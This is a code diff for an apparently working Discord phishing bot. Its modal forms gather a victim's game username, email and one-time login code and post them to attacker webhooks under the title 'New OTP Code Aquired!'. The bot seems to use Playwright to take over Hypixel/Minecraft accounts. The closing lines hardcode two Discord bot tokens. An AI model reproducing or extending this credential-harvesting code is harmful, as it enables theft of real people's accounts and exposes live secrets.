@@ -129,42 +129,42 @@ class MyModal(discord.ui.Modal):
                   break
         #print(url)
         json = {
-  "username": "woly phissha",
-  "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
-  "content": "@everyone idk what im doing",
-  "embeds": [
-    {
-      "author": {
-        "name": "Email And Username Entered  -> Sky Crypt",
-        "color": 2829617,
-        "url": f"https://sky.shiiyu.moe/stats/{username}"
-      },
-      "image": {},
-      "thumbnail": {},
-      "footer": {},
-      "fields": [
-        {
-          "name": "💬 - **Username**",
-          "value": f"```{username}```"
-        },
-        {
-          "name": "✉️ - **E-Mail**",
-          "value": f"```{email}```"
-        },
-        {
-          "name": "🗿 - **Discord Name**",
-          "value": f"```{interaction.user}```"
-        },
-      ]
-    }
-  ],
-    "components": []
-}
+          "username": "[LVL 100] Flying Fish",
+          "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
+          "content": "",
+          "allowed_mentions": {
+            "replied_user": False,
+            "parse": [
+              "everyone"
+            ]
+          },
+          "embeds": [
+          {
+            "type": "rich",
+            "title": 'New OTP Code Aquired!',
+            "description": "",
+            "color": 0x1aff00,
+            "fields": [
+              {
+                "name": 'Username',
+                "value": f'```{username}```'
+              },
+              {
+                "name": 'Email',
+                "value": f'```{email}```'
+              },
+              {
+                "name": "🗿 - **Discord Name**",
+                "value": f"```{interaction.user}```"
+              },
+            ]
+          }
+          ],
+          "components": []
+        }
         requests.post(url=url, json = json, timeout=5000)
         if dhb == True:
            requests.post(url=urldhb, json = json, timeout=5000)
-
-        
 
 import asyncio
 from playwright.async_api import async_playwright
@@ -299,43 +299,44 @@ class MyModal2(discord.ui.Modal):
                   break
 
         json ={
-  "username": "code hehe",
-  "avatar_url": "https://media.discordapp.net/attachments/1087806512442900491/1087813733134381066/0518a2a092bfdc95593b76aead97f220.jpg",
-  "content": "@everyone code take it nerds",
+  "username": "[LVL 100] Flying Fish",
+  "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
+  "content": "",
+  "allowed_mentions": {
+    "replied_user": False,
+    "parse": [
+      "everyone"
+    ]
+  },
   "embeds": [
     {
-      "title": "Code entered!",
-      "color": 2829617,
+      "type": "rich",
+      "title": 'New OTP Code Aquired!',
       "description": "",
-      "timestamp": "",
-      "author": {
-        "name": "otp code (icba to get discord user name - but invxlid was)"
-      },
-      "image": {},
-      "thumbnail": {},
-      "footer": {},
+      "color": 0x1aff00,
       "fields": [
         {
-          "name": "🎁 - OTP (One-time password)",
-          "value": f"```{Code}```"
+          "name": 'Username',
+          "value": f'```{found_entry[0]}```'
         },
         {
-          "name": "💬 - **Username**",
-          "value": f"```{found_entry[0]}```"
+          "name": 'Email',
+          "value": f'```{found_entry[1]}```'
         },
         {
-          "name": "✉️ - **E-Mail**",
-          "value": f"```{found_entry[1]}```"
+          "name": 'Expires In',
+          "value": f'```<t:{utc_time}:R>\`\`\`'
         },
         {
-          "name": "⌛ - Expires in",
-          "value": f"<t:{utc_time}:R>"
+          "name": 'Discord Username',
+          "value": f'```{interaction.user}```'
         },
         {
-          "name": "🗿 - **Discord Name**",
-          "value": f"```{interaction.user}```"
-        },
-      ]
+          "name": 'OTP Code',
+          "value": f'```{Code}```'
+        }
+      ],
+      "url": f'https://sky.shiiyu.moe/stats/{found_entry[0]}'
     }
   ],
   "components": []
@@ -507,5 +508,6 @@ async def setup(ctx):
 
 
 token = "MTA5ODA0OTExNDUwNTIxNjExMA.GsmZi-." + "qTSJXX0m92qfDXncXwNk_E8vz3jgALnCJ0519M"
+token2 = "MTEwODI3NDkyNTY4MjMxNTMwNA.GfwpNr." + "Lv8iacrRbEn0t-I6pVfdbi2rdcGzfax29oAH9Y"
 
-client.run(token)
+client.run(token2)
